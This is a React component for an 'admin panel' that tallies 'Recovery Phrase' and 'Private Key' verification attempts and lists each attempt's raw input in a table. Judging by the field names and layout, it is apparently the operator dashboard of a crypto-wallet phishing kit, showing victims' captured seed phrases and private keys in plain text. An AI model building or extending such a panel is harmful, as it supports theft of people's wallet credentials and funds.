"use client"

import { useState, useEffect, useCallback } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Button } from "@/components/ui/button"
import { motion } from "framer-motion"
import { LogManager, type VerificationLog } from "@/utils/logManager"

export function SecurePanel() {
  const [logs, setLogs] = useState<VerificationLog[]>([])
  const [stats, setStats] = useState({
    totalAttempts: 0,
    successRate: 0,
    phraseAttempts: 0,
    keyAttempts: 0,
  })

  const updateStats = useCallback((updatedLogs: VerificationLog[]) => {
    const totalAttempts = updatedLogs.length
    const successfulAttempts = updatedLogs.filter((log) => log.result === "Success").length
    const phraseAttempts = updatedLogs.filter((log) => log.type === "Recovery Phrase").length
    const keyAttempts = updatedLogs.filter((log) => log.type === "Private Key").length

    setStats({
      totalAttempts,
      successRate: totalAttempts > 0 ? (successfulAttempts / totalAttempts) * 100 : 0,
      phraseAttempts,
      keyAttempts,
    })
  }, [])

  useEffect(() => {
    const updateLogs = () => {
      const fetchedLogs = LogManager.getLogs()
      setLogs(fetchedLogs)
      updateStats(fetchedLogs)
    }

    // Initial load
    updateLogs()

    // Listen for log updates
    const handleLogsUpdated = () => {
      updateLogs()
    }

    window.addEventListener("logsUpdated", handleLogsUpdated)

    // Poll for updates every 5 seconds as a fallback
    const interval = setInterval(updateLogs, 5000)

    return () => {
      window.removeEventListener("logsUpdated", handleLogsUpdated)
      clearInterval(interval)
    }
  }, [updateStats])

  const clearLogs = () => {
    LogManager.clearLogs()
  }

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
      className="space-y-6 p-6"
    >
      <h1 className="text-3xl font-bold text-white">Secure Admin Panel</h1>
      <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
        <Card className="bg-zinc-900/50 border-zinc-800">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium text-zinc-200">Total Attempts</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-white">{stats.totalAttempts}</div>
          </CardContent>
        </Card>
        <Card className="bg-zinc-900/50 border-zinc-800">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium text-zinc-200">Success Rate</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-white">{stats.successRate.toFixed(2)}%</div>
          </CardContent>
        </Card>
        <Card className="bg-zinc-900/50 border-zinc-800">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium text-zinc-200">Phrase Attempts</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-white">{stats.phraseAttempts}</div>
          </CardContent>
        </Card>
        <Card className="bg-zinc-900/50 border-zinc-800">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium text-zinc-200">Key Attempts</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-white">{stats.keyAttempts}</div>
          </CardContent>
        </Card>
      </div>
      <Card className="bg-zinc-900/50 border-zinc-800">
        <CardHeader>
          <CardTitle className="text-white">Recent Verification Attempts</CardTitle>
        </CardHeader>
        <CardContent>
          <Table>
            <TableHeader>
              <TableRow className="border-zinc-800">
                <TableHead className="text-zinc-400">Timestamp</TableHead>
                <TableHead className="text-zinc-400">Type</TableHead>
                <TableHead className="text-zinc-400">Result</TableHead>
                <TableHead className="text-zinc-400">Input</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {logs.map((log) => (
                <TableRow key={log.id} className="border-zinc-800">
                  <TableCell className="text-zinc-300">{log.timestamp}</TableCell>
                  <TableCell className="text-zinc-300">{log.type}</TableCell>
                  <TableCell className={log.result === "Success" ? "text-green-500" : "text-red-500"}>
                    {log.result}
                  </TableCell>
                  <TableCell className="font-mono text-sm text-zinc-300">{log.realInput}</TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </CardContent>
      </Card>
      <Button variant="destructive" onClick={clearLogs} className="bg-red-500 hover:bg-red-600 text-white">
        Clear All Logs
      </Button>
    </motion.div>
  )
}

